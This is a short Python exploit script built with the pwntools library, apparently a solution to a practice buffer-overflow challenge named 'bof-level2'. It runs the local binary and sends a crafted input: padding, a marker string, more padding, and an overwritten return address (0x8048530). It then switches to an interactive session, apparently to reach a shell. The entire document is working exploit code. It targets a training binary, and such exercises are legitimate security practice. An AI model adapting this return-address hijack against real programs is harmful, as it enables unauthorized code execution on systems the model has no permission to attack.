#!/usr/bin/env python

from pwn import *

p = process("./bof-level2")

p.recv()

p.send("A" * 20 + "ABCDEFGH" + "A" * 8 + p32(0x8048530) + "\n")

p.interactive()
